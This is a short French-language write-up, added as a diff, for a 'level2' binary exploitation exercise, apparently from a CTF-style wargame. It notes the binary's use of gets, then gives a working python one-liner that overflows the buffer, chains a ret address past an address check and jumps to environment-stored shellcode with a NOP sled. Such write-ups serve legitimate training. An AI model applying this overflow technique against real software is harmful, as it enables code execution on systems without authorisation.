@@ -1,0 +1,8 @@
+on voit qu'il utilise gets avec un buffer de 76
+on exporte notre shellcode (dans ressources) avec des nop instructions "\x90"
+du coup on inject l'adresse de retour pour bypass le check sur les adresses 0xb000000 et l'adresse de de notre shellcode
+
+								(add ret)			(add shellcode)
+python -c "print 'A' * 80 +'\x3e\x85\x04\x08'  + '\x6d\xfd\xff\xbf'" >/tmp/level2
+cat /tmp/level2 - | ./level2
+GG
